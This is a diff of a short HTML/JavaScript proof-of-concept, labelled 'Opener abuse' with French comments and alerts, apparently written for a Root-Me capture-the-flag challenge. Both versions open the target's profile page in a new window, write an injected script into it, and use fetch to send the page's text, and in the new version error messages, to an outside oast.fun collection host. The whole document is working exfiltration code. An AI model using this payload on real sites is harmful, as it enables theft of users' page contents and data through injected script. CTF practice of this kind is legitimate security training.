@@ -1,19 +1,21 @@
-<!DOCTYPE html>
-<html>
-  <body>
-    <h1>PoC - Opener abuse</h1>
-    <script>
-      const win = window.open("http://challenge01.root-me.org:58003/profile", "_blank");
-      setTimeout(() => {
-        if (win) {
-          win.document.write(`
-            <script>
-              fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun?data=" + 
-                encodeURIComponent(document.querySelector('u').parentElement.innerText));
-            <\/script>
-          `);
-        }
-      }, 1000); // petite pause pour que la page charge
-    </script>
-  </body>
-</html>
+<script>
+  const win = window.open("http://challenge01.root-me.org:58003/profile", "_blank");
+  setTimeout(() => {
+    if (win) {
+      alert("Fenêtre ouverte !");
+      try {
+        win.document.write(`
+          <script>
+            fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun?data=" + 
+              encodeURIComponent(document.querySelector('u').parentElement.innerText));
+          <\/script>
+        `);
+      } catch (e) {
+        fetch("https://jrnhteacxragwsxmgdxlwnh0wn3hp1vx0.oast.fun?error=" + encodeURIComponent(e.message));
+      }
+    } else {
+      alert("La fenêtre ne s'est pas ouverte !");
+    }
+  }, 1500);
+</script>
+
